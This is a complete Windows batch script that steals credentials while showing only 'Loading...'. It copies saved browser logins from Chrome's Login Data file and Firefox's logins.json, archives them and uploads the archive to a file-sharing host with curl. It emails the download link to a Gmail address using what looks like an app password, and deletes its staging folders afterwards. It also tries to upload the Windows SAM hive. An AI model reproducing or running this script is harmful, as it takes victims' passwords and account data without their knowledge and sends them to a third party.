@echo off
echo Loading...
:powershell -window minimized -command ""
:powershell -window hidden -command ""
cd C:/
md Upld
cd Upld
set mainpath=%cd%

cd C:/
mkdir logindata
cd logindata
copy "%LocalAppData%\Google\Chrome\User Data\Default\Login Data" logindata_%UserName%_%Date%.chrome

echo Firefox
cd "%appdata%\Mozilla\Firefox\Profiles"
cd *-release
copy logins.json "C:\logindata\firefox_%username%_%date%.json"
echo firefox done

:mainpath
cd %mainpath%
md Files
cd Files
copy "C:\logindata\*"
cd %mainpath%
timeout 1
jar cf Archive-%UserName%.jar Files/*
curl -F "file=@Archive-%UserName%.jar" https://api.anonfiles.com/upload > Link-%UserName%.dstr
call C:\tools\sendmail.bat pc.skola.files.send@gmail.com dnjppkiqfvpvojxg "%mainpath%\Link-%UserName%.dstr"

timeout 3
cd C:/
del /F /Q "C:\logindata"
del /F /Q "C:\logindata\"
del /F /Q "C:\logindata\*"
del /F /Q "C:\Upld"
del /F /Q "C:\Upld\"
del /F /Q "C:\Upld\*"

cd C:\
mkdir testovani
cd testovani
curl -F "file=@C:\WINDOWS\SYSTEM32\config\SAM" https://api.anonfiles.com/upload > XDD.dstr
call C:\tools\sendmail.bat pc.skola.files.send@gmail.com dnjppkiqfvpvojxg "C:\testovani\XDD.dstr"

pause